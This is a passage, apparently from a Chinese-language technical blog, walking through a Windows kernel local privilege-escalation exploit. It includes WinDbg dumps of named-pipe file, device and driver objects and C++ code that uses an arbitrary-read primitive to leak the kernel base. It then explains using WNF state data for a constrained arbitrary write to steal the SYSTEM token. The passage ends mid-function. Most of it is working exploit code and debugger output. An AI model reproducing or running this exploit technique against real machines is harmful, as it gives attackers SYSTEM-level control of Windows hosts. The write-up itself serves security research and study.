class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_file_object ffffc58e059bd8a0</span><br><span class="line">   +<span class="number">0x000</span> Type             : <span class="number">0</span>n5</span><br><span class="line">   +<span class="number">0x002</span> Size             : <span class="number">0</span>n216</span><br><span class="line">   +<span class="number">0x008</span> DeviceObject     : <span class="number">0xffffc58d</span>`ff133060 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x010</span> Vpb              : (null) </span><br><span class="line">   +<span class="number">0x018</span> FsContext        : <span class="number">0xffff9f08</span>`<span class="number">40</span>a9a750 Void</span><br><span class="line">   +<span class="number">0x020</span> FsContext2       : <span class="number">0xffff9f08</span>`<span class="number">435</span>c6091 Void</span><br><span class="line">   +<span class="number">0x028</span> SectionObjectPointer : (null) </span><br><span class="line">   +<span class="number">0x030</span> PrivateCacheMap  : <span class="number">0x00000000</span>`<span class="number">00000001</span> Void</span><br><span class="line">   +<span class="number">0x038</span> FinalStatus      : <span class="number">0</span>n0</span><br><span class="line">   +<span class="number">0x040</span> RelatedFileObject : <span class="number">0xffffc58e</span>`<span class="number">0598</span>a130 _FILE_OBJECT</span><br><span class="line">   +<span class="number">0x048</span> LockOperation    : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x049 DeletePending    : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04a</span> ReadAccess       : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04b WriteAccess      : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04c</span> DeleteAccess     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04d SharedRead       : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x04e</span> SharedWrite      : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x04f SharedDelete     : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x050</span> Flags            : <span class="number">0x40082</span></span><br><span class="line">   +<span class="number">0x058</span> FileName         : _UNICODE_STRING <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> CurrentByteOffset : _LARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x070</span> Waiters          : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x074</span> Busy             : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x078</span> LastLock         : (null) </span><br><span class="line">   +<span class="number">0x080</span> Lock             : _KEVENT</span><br><span class="line">   +<span class="number">0x098</span> Event            : _KEVENT</span><br><span class="line">   +<span class="number">0x0b0</span> CompletionContext : (null) </span><br><span class="line">   +<span class="number">0x0b8</span> IrpListLock      : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> IrpList          : _LIST_ENTRY [ <span class="number">0xffffc58e</span>`<span class="number">059b</span>d960 - <span class="number">0xffffc58e</span>`<span class="number">059b</span>d960 ]</span><br><span class="line">   +<span class="number">0x0d0</span> FileObjectExtension : (null)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DeviceObject</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffffc58dfda7d380 -r1 -<span class="built_in">nv</span> (*((ntkrnlmp!_DEVICE_OBJECT *)<span class="number">0xffffc58dff133060</span>))</span><br><span class="line">(*((ntkrnlmp!_DEVICE_OBJECT *)<span class="number">0xffffc58dff133060</span>))                 : Device <span class="keyword">for</span> <span class="string">&quot;\FileSystem\Npfs&quot;</span> [Type: _DEVICE_OBJECT]</span><br><span class="line">    [+<span class="number">0x000</span>] Type             : <span class="number">3</span> [Type: <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x002</span>] Size             : <span class="number">0x308</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x004</span>] ReferenceCount   : <span class="number">81</span> [Type: <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x008</span>] DriverObject     : <span class="number">0xffffc58dff9e0e00</span> : Driver <span class="string">&quot;\FileSystem\Npfs&quot;</span> [Type: _DRIVER_OBJECT *]</span><br><span class="line">    [+<span class="number">0x010</span>] NextDevice       : <span class="number">0x0</span> [Type: _DEVICE_OBJECT *]</span><br><span class="line">    [+<span class="number">0x018</span>] AttachedDevice   : <span class="number">0xffffc58dffc08b50</span> : Device <span class="keyword">for</span> <span class="string">&quot;\FileSystem\FltMgr&quot;</span> [Type: _DEVICE_OBJECT *]</span><br><span class="line">    [+<span class="number">0x020</span>] CurrentIrp       : <span class="number">0x0</span> [Type: _IRP *]</span><br><span class="line">    [+<span class="number">0x028</span>] Timer            : <span class="number">0x0</span> [Type: _IO_TIMER *]</span><br><span class="line">    [+<span class="number">0x030</span>] Flags            : <span class="number">0x240</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x034</span>] Characteristics  : <span class="number">0x20000</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x038</span>] Vpb              : <span class="number">0x0</span> [Type: _VPB *]</span><br><span class="line">    [+<span class="number">0x040</span>] DeviceExtension  : <span class="number">0xffffc58dff1331b0</span> [Type: <span class="type">void</span> *]</span><br><span class="line">    [+<span class="number">0x048</span>] DeviceType       : <span class="number">0x11</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x04c</span>] StackSize        : <span class="number">1</span> [Type: <span class="type">char</span>]</span><br><span class="line">    [+<span class="number">0x050</span>] Queue            [Type: &lt;anonymous-tag&gt;]</span><br><span class="line">    [+<span class="number">0x098</span>] AlignmentRequirement : <span class="number">0x0</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x0a0</span>] DeviceQueue      [Type: _KDEVICE_QUEUE]</span><br><span class="line">    [+<span class="number">0x0c8</span>] Dpc              [Type: _KDPC]</span><br><span class="line">    [+<span class="number">0x108</span>] ActiveThreadCount : <span class="number">0x0</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x110</span>] SecurityDescriptor : <span class="number">0xffff9f083b88ff20</span> [Type: <span class="type">void</span> *]</span><br><span class="line">    [+<span class="number">0x118</span>] DeviceLock       [Type: _KEVENT]</span><br><span class="line">    [+<span class="number">0x130</span>] SectorSize       : <span class="number">0x0</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x132</span>] Spare1           : <span class="number">0x1</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x138</span>] DeviceObjectExtension : <span class="number">0xffffc58dff133368</span> [Type: _DEVOBJ_EXTENSION *]</span><br><span class="line">    [+<span class="number">0x140</span>] Reserved         : <span class="number">0x0</span> [Type: <span class="type">void</span> *]</span><br><span class="line"></span><br><span class="line"><span class="comment">// DriverObject</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffffc58dfda7d380 -r1 -<span class="built_in">nv</span> (*((ntkrnlmp!_DRIVER_OBJECT *)<span class="number">0xffffc58dff9e0e00</span>))</span><br><span class="line">(*((ntkrnlmp!_DRIVER_OBJECT *)<span class="number">0xffffc58dff9e0e00</span>))                 : Driver <span class="string">&quot;\FileSystem\Npfs&quot;</span> [Type: _DRIVER_OBJECT]</span><br><span class="line">    [+<span class="number">0x000</span>] Type             : <span class="number">4</span> [Type: <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x002</span>] Size             : <span class="number">336</span> [Type: <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x008</span>] DeviceObject     : <span class="number">0xffffc58dff133060</span> : Device <span class="keyword">for</span> <span class="string">&quot;\FileSystem\Npfs&quot;</span> [Type: _DEVICE_OBJECT *]</span><br><span class="line">    [+<span class="number">0x010</span>] Flags            : <span class="number">0x12</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x018</span>] DriverStart      : <span class="number">0xfffff80586a00000</span> [Type: <span class="type">void</span> *]</span><br><span class="line">    [+<span class="number">0x020</span>] DriverSize       : <span class="number">0x1c000</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x028</span>] DriverSection    : <span class="number">0xffffc58dff999050</span> [Type: <span class="type">void</span> *]</span><br><span class="line">    [+<span class="number">0x030</span>] DriverExtension  : <span class="number">0xffffc58dff9e0f50</span> [Type: _DRIVER_EXTENSION *]</span><br><span class="line">    [+<span class="number">0x038</span>] DriverName       [Type: _UNICODE_STRING]</span><br><span class="line">    [+<span class="number">0x048</span>] HardwareDatabase : <span class="number">0xfffff80583dab8f8</span> : <span class="string">&quot;\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM&quot;</span> [Type: _UNICODE_STRING *]</span><br><span class="line">    [+<span class="number">0x050</span>] FastIoDispatch   : <span class="number">0xffffc58dff16e150</span> [Type: _FAST_IO_DISPATCH *]</span><br><span class="line">    [+<span class="number">0x058</span>] DriverInit       : <span class="number">0xfffff80586a18010</span> : Npfs!GsDriverEntry+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DRIVER_OBJECT *,_UNICODE_STRING *)]</span><br><span class="line">    [+<span class="number">0x060</span>] DriverStartIo    : <span class="number">0x0</span> : <span class="number">0x0</span> [Type: <span class="built_in">void</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [+<span class="number">0x068</span>] DriverUnload     : <span class="number">0x0</span> : <span class="number">0x0</span> [Type: <span class="built_in">void</span> (__cdecl*)(_DRIVER_OBJECT *)]</span><br><span class="line">    [+<span class="number">0x070</span>] MajorFunction    [Type: <span class="built_in">long</span> (__cdecl* [<span class="number">28</span>])(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line"></span><br><span class="line"><span class="comment">// DeviceObject</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffffc58dfda7d380 -<span class="built_in">r1</span> (*((ntkrnlmp!<span class="built_in">long</span> (__cdecl*(*)[<span class="number">28</span>])(_DEVICE_OBJECT *,_IRP *))<span class="number">0xffffc58dff9e0e70</span>))</span><br><span class="line">(*((ntkrnlmp!<span class="built_in">long</span> (__cdecl*(*)[<span class="number">28</span>])(_DEVICE_OBJECT *,_IRP *))<span class="number">0xffffc58dff9e0e70</span>))                 [Type: <span class="built_in">long</span> (__cdecl* [<span class="number">28</span>])(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">0</span>]              : <span class="number">0xfffff80586a0b670</span> : Npfs!NpFsdCreate+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">1</span>]              : <span class="number">0xfffff80586a0b270</span> : Npfs!NpFsdCreateNamedPipe+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">2</span>]              : <span class="number">0xfffff80586a0eaf0</span> : Npfs!NpFsdClose+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">3</span>]              : <span class="number">0xfffff80586a0d400</span> : Npfs!NpFsdRead+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">4</span>]              : <span class="number">0xfffff80586a0db10</span> : Npfs!NpFsdWrite+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">5</span>]              : <span class="number">0xfffff80586a0fb90</span> : Npfs!NpFsdQueryInformation+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">6</span>]              : <span class="number">0xfffff80586a0f980</span> : Npfs!NpFsdSetInformation+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">7</span>]              : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">8</span>]              : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">9</span>]              : <span class="number">0xfffff80586a13ec0</span> : Npfs!NpFsdFlushBuffers+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">10</span>]             : <span class="number">0xfffff80586a16250</span> : Npfs!NpFsdQueryVolumeInformation+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">11</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">12</span>]             : <span class="number">0xfffff80586a13030</span> : Npfs!NpFsdDirectoryControl+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">13</span>]             : <span class="number">0xfffff80586a0cb50</span> : Npfs!NpFsdFileSystemControl+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">14</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">15</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">16</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">17</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">18</span>]             : <span class="number">0xfffff80586a0ed50</span> : Npfs!NpFsdCleanup+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">19</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">20</span>]             : <span class="number">0xfffff80586a106a0</span> : Npfs!NpFsdQuerySecurityInfo+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">21</span>]             : <span class="number">0xfffff80586a0fe00</span> : Npfs!NpFsdSetSecurityInfo+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">22</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">23</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">24</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">25</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">26</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line">    [<span class="number">27</span>]             : <span class="number">0xfffff80583525d40</span> : ntkrnlmp!IopInvalidDeviceRequest+<span class="number">0x0</span> [Type: <span class="built_in">long</span> (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]</span><br><span class="line"></span><br><span class="line"><span class="comment">// ntkrnlmp!IopInvalidDeviceRequest</span></span><br><span class="line"><span class="number">0</span>: kd&gt; u fffff80583525d40</span><br><span class="line">nt!IopInvalidDeviceRequest:</span><br><span class="line">fffff805`<span class="number">83525</span>d40 <span class="number">4883</span>ec28        sub     rsp,<span class="number">28</span>h</span><br><span class="line">fffff805`<span class="number">83525</span>d44 <span class="number">488b</span>ca          mov     rcx,rdx</span><br><span class="line">fffff805`<span class="number">83525</span>d47 c74230100000c0  mov     dword ptr [rdx+<span class="number">30</span>h],<span class="number">0</span>C0000010h</span><br><span class="line">fffff805`<span class="number">83525</span>d4e <span class="number">33</span>d2            <span class="keyword">xor</span>     edx,edx</span><br><span class="line">fffff805`<span class="number">83525</span>d50 e8db3ff1ff      call    nt!<span class="built_in">IofCompleteRequest</span> (fffff805`<span class="number">83439</span>d30)</span><br><span class="line">fffff805`<span class="number">83525</span>d55 b8100000c0      mov     eax,<span class="number">0</span>C0000010h</span><br><span class="line">fffff805`<span class="number">83525</span>d5a <span class="number">4883</span>c428        add     rsp,<span class="number">28</span>h</span><br><span class="line">fffff805`<span class="number">83525</span>d5e c3              ret</span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT64 <span class="title">leakKernelAddr</span><span class="params">(UINT64 fd, PWNF_STATE_NAME state, PVOID pQueryBuffer, PipeHandles pipeHandles)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] leakKernelAddr &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG    </span></span></span><br><span class="line"></span><br><span class="line">    UINT64 currentfd = fd;</span><br><span class="line">    UINT64 nextfd = <span class="number">0</span>;</span><br><span class="line">    UINT64 tag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_WRITE_ROUNDS; i++) &#123;</span><br><span class="line">        tag = <span class="built_in">arbRead64</span>(currentfd - <span class="number">0x10</span>, state, pQueryBuffer, pipeHandles) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        nextfd = <span class="built_in">arbRead64</span>(currentfd, state, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="keyword">if</span> (tag != <span class="number">0x7441704e</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;[+] find the special chunk : &quot;</span> &lt;&lt; std::hex &lt;&lt; currentfd &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        currentfd = nextfd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UINT64 pFileObject = <span class="built_in">arbRead64</span>(currentfd - FILE_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 pDeviceObject = <span class="built_in">arbRead64</span>(pFileObject + DEVICE_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 pDriverObject = <span class="built_in">arbRead64</span>(pDeviceObject + DRIVER_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 pIopInvalidDeviceRequest = <span class="built_in">arbRead64</span>(pDriverObject + MAJOR_FUNCTION_OFFSET + IOP_INVALID_DEVICE_REQUEST_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 kernelBase = pIopInvalidDeviceRequest - IOP_INVALID_DEVICE_REQUEST_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pFileObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pFileObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pDeviceObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pDeviceObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pDriverObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pDriverObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pIopInvalidDeviceRequest : &quot;</span> &lt;&lt; std::hex &lt;&lt; pIopInvalidDeviceRequest &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] kernelBase : &quot;</span> &lt;&lt; std::hex &lt;&lt; kernelBase &lt;&lt; std::endl;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kernelBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="有限制的任意地址写和提权"><a href="#有限制的任意地址写和提权" class="headerlink" title="有限制的任意地址写和提权"></a>有限制的任意地址写和提权</h2><p>最后是任意地址写，在这里由于我们可以控制溢出的堆块大小，所以可以使用指定大小的结构体的利用方式，这里使用的是之前的 <code>_WNF_NAME_INSTANCE</code> ，其大小为 <code>0xa8 + 0x10 = 0xb8</code> ，申请的时候的堆块大小便为 <code>0xc0</code> 。通过堆喷出来能够够到的 <code>_WNF_NAME_INSTANCE</code>  ，然后改写 <code>StateData</code> 指针并通过 <code>NtUpdateWnfStateData</code> 去改写它。</p>
<p>然而在 <code>NtUpdateWnfStateData</code>  中使用的 <code>ExpWnfWriteStateData</code> 函数会有一些限制，首先改写的 <code>size</code> 不能大于 <code>allocSize</code> ，否则会重新分配。其次改写的逻辑如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memmove</span>(&amp;wnfStateData-&gt;data, src, size);</span><br><span class="line">wnfStateData-&gt;DataSize = size;</span><br><span class="line">wnfStateData-&gt;ChangeStamp = i;</span><br></pre></td></tr></table></figure>

<p>它会更新 <code>DataSize</code> 和 <code>ChangeStamp</code> 部分，所以会导致改写到其他的地方。因而如果我们直接改写 <code>eprocess</code> 的 <code>token</code> 则会覆盖到上面的这部分区域，从而导致出错：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">...</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortData : Ptr64 Void</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortValue : Uint8B</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">		+<span class="number">0x360</span> Token            : _EX_FAST_REF</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>既然不能从这里写，那么我们可以找一个影响不大的地方开始写，最后我选择了 <code>0x310</code> 处的 <code>CreateTime</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">...</span><br><span class="line">		+<span class="number">0x310</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">		+<span class="number">0x318</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint8B</span><br><span class="line">		+<span class="number">0x328</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint8B</span><br><span class="line">		+<span class="number">0x338</span> PeakVirtualSize  : Uint8B</span><br><span class="line">		+<span class="number">0x340</span> VirtualSize      : Uint8B</span><br><span class="line">		+<span class="number">0x348</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortData : Ptr64 Void</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortValue : Uint8B</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortData : Ptr64 Void</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortValue : Uint8B</span><br><span class="line">		+<span class="number">0x358</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">		+<span class="number">0x360</span> Token            : _EX_FAST_REF</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>只需要遍历 <code>_WNF_NAME_INSTANCE</code>  存储的 <code>eprocess</code> ，然后替换 <code>system</code> 的 <code>token</code> 到我们这个程序来即可：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">changeToken</span><span class="params">(UINT64 eprocess, 